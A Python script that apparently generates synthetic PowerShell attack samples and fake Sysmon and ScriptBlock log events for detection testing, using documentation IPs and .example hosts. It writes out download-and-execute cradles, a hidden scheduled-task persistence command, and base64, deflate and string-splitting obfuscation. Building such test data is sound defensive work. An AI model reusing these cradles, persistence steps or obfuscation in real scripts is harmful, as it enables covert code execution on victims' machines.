"""Regenerates the synthetic samples. Everything uses RFC 5737 documentation IPs and
.example domains: nothing here points at real infrastructure and nothing is functional."""
import base64
import zlib
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"


def enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


def deflate_b64(script: str) -> str:
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return base64.b64encode(c.compress(script.encode()) + c.flush()).decode()


cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
admin = "Get-Service | Where-Object Status -eq Running | Select-Object -First 5"
stage2 = ("$c = 'Down'+'loadString'; $u = 'http://' + '203.0.113.7' + '/stage2.ps1'; "
          "$w = New-Object Net.WebClient; IEX ($w.$c($u)); "
          "schtasks /create /tn Updater /tr 'powershell -nop -w hidden -c iex(irm http://update-check.example/r)' /sc hourly")
wrapper = ("IEX ([IO.StreamReader]::new((New-Object IO.Compression.DeflateStream("
           f"[IO.MemoryStream][Convert]::FromBase64String('{deflate_b64(stage2)}'),"
           "[IO.Compression.CompressionMode]::Decompress))).ReadToEnd())")

(OUT / "encoded_cradle.txt").write_text(
    "# one command line per line; '#' lines are ignored\n"
    f"powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -EncodedCommand {enc(cradle)}\n"
    f"powershell.exe -nop -enc {enc(admin)}\n"
    "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1\n"
)

(OUT / "layered_dropper.txt").write_text(f"powershell -w hidden -nop -e {enc(wrapper)}\n")

obf = ("&('i'+'ex') (New-Object Net.WebClient).('Download'+'String')('http://203.0.113.7/p.ps1');"
       "I`E`X ([char]73+[char]69+[char]88)")
(OUT / "obfuscated_strings.txt").write_text(obf + "\n")


def sysmon(guid, image, cmd, parent, user, host, t):
    return f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><Computer>{host}</Computer></System>
  <EventData>
    <Data Name="UtcTime">{t}</Data><Data Name="ProcessGuid">{{{guid}}}</Data>
    <Data Name="Image">{image}</Data><Data Name="CommandLine">{cmd}</Data>
    <Data Name="User">{user}</Data><Data Name="ParentImage">{parent}</Data>
  </EventData>
</Event>
"""


PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
xml = sysmon("11111111-0000-0000-0000-000000000001", PS,
             f"powershell.exe -nop -w hidden -enc {enc(cradle)}",
             "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
             "CORP\\jdoe", "WKS-0142.corp.example", "2026-09-12 08:14:03.221")
xml += sysmon("11111111-0000-0000-0000-000000000002", PS,
              f"powershell.exe -ExecutionPolicy Bypass -enc {enc(admin)}",
              "C:\\Windows\\CCM\\CcmExec.exe", "NT AUTHORITY\\SYSTEM", "SRV-APP01.corp.example", "2026-09-12 08:20:10.004")
xml += sysmon("11111111-0000-0000-0000-000000000003", "C:\\Windows\\System32\\notepad.exe",
              "notepad.exe notes.txt", "C:\\Windows\\explorer.exe", "CORP\\jdoe", "WKS-0142.corp.example",
              "2026-09-12 08:21:00.000")
xml += sysmon("11111111-0000-0000-0000-000000000004", PS,
              f"powershell -w hidden -nop -e {enc(wrapper)}",
              "C:\\Windows\\System32\\wscript.exe", "CORP\\asmith", "WKS-0377.corp.example", "2026-09-12 09:02:41.870")
(OUT / "sysmon_event1.xml").write_text(xml)

half = len(stage2) // 2


def sb(n, text):
    return f"""<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System><EventID>4104</EventID><Computer>WKS-0377.corp.example</Computer><TimeCreated SystemTime="2026-09-12T09:02:44.100Z"/></System>
  <EventData><Data Name="MessageNumber">{n}</Data><Data Name="MessageTotal">2</Data>
  <Data Name="ScriptBlockText">{text.replace("&", "&amp;").replace("<", "&lt;")}</Data>
  <Data Name="ScriptBlockId">aaaaaaaa-bbbb-cccc-dddd-000000000001</Data></EventData>
</Event>
"""


(OUT / "scriptblock_4104.xml").write_text(sb(1, stage2[:half]) + sb(2, stage2[half:]))
print("samples written")
